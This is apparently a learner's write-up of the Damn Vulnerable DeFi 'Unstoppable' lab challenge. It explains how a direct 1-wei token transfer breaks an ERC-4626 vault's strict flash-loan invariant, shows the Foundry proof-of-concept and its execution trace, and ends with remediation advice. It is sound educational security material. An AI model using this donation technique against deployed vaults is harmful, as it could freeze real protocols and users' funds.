---
Created: 2026-11-22
tags:
  - web3
  - erc20
  - fundamentals
  - easy
  - erc4626
---
 
# 1. Overview of the Files
## Scenario & Objective

```bash
┌──(mdn0x㉿mdn0xKali)-[~/Web3SEC/damn-vulnerable-defi/src/unstoppable]
└─$ cat README.md 
# Unstoppable

There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There's a monitoring contract to check liveness of the flashloan feature.

Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.

```
## First Analysis 

* **`UnstoppableVault.sol` (The Target):** An **ERC-4626** tokenized vault holding `1,000,000 DVT` tokens that also offers **ERC-3156 Flash Loans** for a fee.
* **`Unstoppable.t.sol` (The Foundry Test Environment):** The simulated blockchain scenario:
  1. **`setUp()`:** Deploys the token and the vault, deposits `1,000,000e18` tokens into the vault (minting `1,000,000e18` shares in return), and funds the `player` account with **`10e18` tokens**.
  2. **`_isSolved()`:** Defines the success condition. The goal is not to steal funds, but to **break the flash loan mechanism** (`FlashLoanStatus(false)`), forcing `UnstoppableMonitor` to pause the vault and transfer ownership back to `deployer`.

---

# 2. Where the Vulnerability Hides (UnstoppableVault.sol)

The flaw stems from an accounting mismatch between two functions inside `UnstoppableVault.sol`:

## A. How the Vault Counts Its Assets (`totalAssets()`)

```js
function totalAssets() public view override nonReadReentrant returns (uint256) {
    return asset.balanceOf(address(this));
}
```
The vault does not maintain an internal accounting variable for deposits made through `deposit()`. Instead, it checks **how many tokens physically sit at its own address** (`asset.balanceOf(address(this))`).

## B. The Strict Invariant Check Inside `flashLoan()`js

```solidityc
uint256 balanceBefore = totalAssets();
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

* Initially, `1,000,000e18` tokens are deposited (`balanceBefore = 1_000_000e18`) and `1,000,000e18` shares are minted (`totalSupply = 1_000_000e18`).
* Under normal conditions, the ratio is **1:1**: `convertToShares(totalSupply)` returns `1_000_000e18`, matching `balanceBefore`. The check passes and the flash loan executes.
* **If those two values diverge by even `1 wei`**, `revert InvalidBalance()` triggers and **permanently blocks all future flash loans** (Denial of Service).

---

# 3. Root Cause & Attack Mechanics (Accounting Mismatch)

The protocol assumes tokens can only enter the vault through `deposit()` (which updates both the contract's token balance and `totalSupply` simultaneously).

However, on EVM chains, **anyone holding at least `1 wei` of the underlying ERC-20 token can transfer it directly to the vault address** via `token.transfer(...)`, completely bypassing `deposit()`:

1. **Initial State:** `totalSupply = 1,000,000e18` | `asset.balanceOf(vault) = 1,000,000e18`. The invariant `convertToShares(totalSupply) == balanceBefore` holds true.

2. **State Manipulation:** Transferring even `1 wei` (or the player's `10e18` tokens) directly to `address(vault)` via `token.transfer` increases `balanceBefore` to `1,000,000e18 + 1`, while `totalSupply` remains `1,000,000e18`.

3. **Impact:** On the next `flashLoan()` call, `convertToShares(totalSupply) != balanceBefore` evaluates to true (`1,000,000e18 != 1,000,000e18 + 1`), causing an unconditional `revert InvalidBalance()`. `UnstoppableMonitor` catches the failure and pauses the vault.

---

# 4. Reasoning Through Unstoppable.t.sol

Inside `Unstoppable.t.sol`, the `test_unstoppable()` test uses the `checkSolvedByPlayer` modifier:

```js
function test_unstoppable() public checkSolvedByPlayer {
    // Calls placed here execute as `player` (who holds 10e18 DVT tokens)
}
```

Any call inside `test_unstoppable()` is executed via `vm.startPrank(player, player)`, after which Foundry automatically calls `_isSolved()` to verify that `monitorContract.checkFlashLoan(100e18)` fails and pauses the vault.

*Hint:* Look at the `token` and `vault` state variables already declared at the top of `UnstoppableChallenge` and how `player` can send tokens directly to `vault`.

---
# 5. Exploit PoC

Open the **`test/unstoppable/Unstoppable.t.sol`** file and find `CODE YOUR SOLUTION HERE`:

```js
/**
 * CODE YOUR SOLUTION HERE 
 */ function test_unstoppable() public checkSolvedByPlayer {
  // Transfer token to address(vault)
}
```

totalAssets()         

```js
return asset.balanceOf(address(this));
```

Standard in ERC-20 to transfer from `player` to address(vault):

```js
token.transfer(address to, uint256 amount)
```

So we can use [Nano](../../../3%20-%20Tags/Hacking%20Tools/Nano.md) or `vim` or `VSCode` and modify:

```js
/**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }
```

Verify the result:

```js
forge test --match-path test/unstoppable/Unstoppable.t.sol -vvvv

[⠒] Compiling...
[⠰] Compiling 1 files with Solc 0.8.25
[⠔] Solc 0.8.25 finished in 1.21s
Compiler run successful!

Ran 2 tests for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge
[PASS] test_assertInitialState() (gas: 210199)
Traces:
  [210199] UnstoppableChallenge::test_assertInitialState()
    ├─ [2516] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24]) [staticcall]                                                                                                      
    │   └─ ← [Return]
    ├─ [2516] DamnValuableToken::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]                                                                                                 
    │   └─ ← [Return] 10000000000000000000 [1e19]
    ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [2335] UnstoppableMonitor::owner() [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return]
    ├─ [261] UnstoppableVault::asset() [staticcall]
    │   └─ ← [Return] DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]
    ├─ [0] VM::assertEq(DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]) [staticcall]
    │   └─ ← [Return]
    ├─ [7744] UnstoppableVault::totalAssets() [staticcall]
    │   ├─ [2516] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24]) [staticcall]                                                                                                      
    │   └─ ← [Return]
    ├─ [2329] UnstoppableVault::totalSupply() [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24]) [staticcall]                                                                                                      
    │   └─ ← [Return]
    ├─ [8154] UnstoppableVault::maxFlashLoan(DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]) [staticcall]
    │   ├─ [2516] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24]) [staticcall]                                                                                                      
    │   └─ ← [Return]
    ├─ [8302] UnstoppableVault::flashFee(DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 999999999999999999999999 [9.999e23]) [staticcall]
    │   ├─ [2516] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [8479] UnstoppableVault::flashFee(DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 1000000000000000000000000 [1e24]) [staticcall]
    │   ├─ [2516] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   └─ ← [Return] 50000000000000000000000 [5e22]
    ├─ [0] VM::assertEq(50000000000000000000000 [5e22], 50000000000000000000000 [5e22]) [staticcall]
    │   └─ ← [Return]
    ├─ [2403] UnstoppableVault::owner() [staticcall]
    │   └─ ← [Return] UnstoppableMonitor: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    ├─ [0] VM::assertEq(UnstoppableMonitor: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], UnstoppableMonitor: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]) [staticcall]
    │   └─ ← [Return]
    ├─ [2348] UnstoppableVault::paused() [staticcall]
    │   └─ ← [Return] false
    ├─ [0] VM::assertFalse(false) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(UNAUTHORIZED)
    │   └─ ← [Return]
    ├─ [23841] UnstoppableVault::setPause(true)
    │   └─ ← [Revert] UNAUTHORIZED
    ├─ [0] VM::expectRevert(UNAUTHORIZED)
    │   └─ ← [Return]
    ├─ [23758] UnstoppableMonitor::checkFlashLoan(100000000000000000000 [1e20])
    │   └─ ← [Revert] UNAUTHORIZED
    └─ ← [Stop]

[PASS] test_unstoppable() (gas: 129767)
Traces:
  [129767] UnstoppableChallenge::test_unstoppable()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [34142] DamnValuableToken::transfer(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 1)
    │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], amount: 1)                                           
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::prank(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
    │   └─ ← [Return]
    ├─ [0] VM::expectEmit()
    │   └─ ← [Return]
    ├─ emit FlashLoanStatus(success: false)
    ├─ [55044] UnstoppableMonitor::checkFlashLoan(100000000000000000000 [1e20])
    │   ├─ [261] UnstoppableVault::asset() [staticcall]
    │   │   └─ ← [Return] DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]
    │   ├─ [11766] UnstoppableVault::flashLoan(UnstoppableMonitor: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 100000000000000000000 [1e20], 0x)
    │   │   ├─ [2516] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000001 [1e24]
    │   │   ├─ [516] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000001 [1e24]
    │   │   └─ ← [Revert] InvalidBalance()
    │   ├─ emit FlashLoanStatus(success: false)
    │   ├─ [8814] UnstoppableVault::setPause(true)
    │   │   ├─ emit Paused(account: UnstoppableMonitor: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6])
    │   │   └─ ← [Stop]
    │   ├─ [5174] UnstoppableVault::transferOwnership(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
    │   │   ├─ emit OwnershipTransferred(previousOwner: UnstoppableMonitor: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], newOwner: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])                   
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [2348] UnstoppableVault::paused() [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::assertTrue(true, "Vault is not paused") [staticcall]
    │   └─ ← [Return]
    ├─ [2403] UnstoppableVault::owner() [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], "Vault did not change owner") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 16.32ms (1.88ms CPU time)

Ran 1 test suite in 65.16ms (16.32ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
                                                                                                       
```

The challenge is completely solved (`Suite result: ok. 2 passed; 0 failed`). Here is the exact breakdown of what happened inside the EVM execution trace for `test_unstoppable()`:

- Impersonation (`VM::startPrank`): Foundry sets both `msg.sender` and `tx.origin` to the `player` address (`0x44E9...`).

- The Exploit Action (`DamnValuableToken::transfer`): `player` sends `1 wei` directly to the vault address. The vault's physical token balance increases from `1000000000000000000000000` (`1e24`) to `1000000000000000000000001`, while `totalSupply` stays at `1e24`.

-  Monitor Check & Forced Revert (`UnstoppableMonitor::checkFlashLoan`): `deployer` triggers the monitoring check. Inside `flashLoan()`, `totalAssets()` reads the new balance (`...0001`), which fails the invariant `convertToShares(totalSupply) != balanceBefore` and immediately reverts with `InvalidBalance()`.

- Protocol Shutdown (`setPause` & `transferOwnership`): `UnstoppableMonitor` catches the failed flash loan, emits `FlashLoanStatus(false)`, pauses the vault, and returns ownership to `deployer`.

- Final Assertions (`_isSolved()`): Foundry confirms both post-conditions hold true, passing the test in `16.32ms`.

## Trace Reading Quick Reference (For Future Challenges)

- **`├─ [gas] Contract::function(args)`**: An external call into a contract, showing gas consumed in brackets.
 
- **`│ └─ ← [Return] value`**: The call succeeded and returned `value`.
 
- **`│ └─ ← [Revert] ErrorName()`**: The call failed at that exact line (the root cause of a DoS or blocked transaction).
 
- **`[staticcall]`**: A read-only `view` call that does not modify blockchain state.

---

# 6. Remediation (How to Fix It in Production)

1. **Track Managed Assets Internally:** Never rely on `asset.balanceOf(address(this))` for `totalAssets()` in ERC-4626 vaults when strict share-to-asset parity is enforced. Maintain an internal state variable (e.g., `uint256 private _totalManagedAssets`) updated exclusively inside `deposit()`, `mint()`, `withdraw()`, and `redeem()`.

2. **Remove the Strict Equality Check:** In `flashLoan()`, avoid reverting on `convertToShares(totalSupply) != balanceBefore`, or check `balanceBefore >= convertToAssets(totalSupply)` so unsolicited token donations cannot brick the contract.
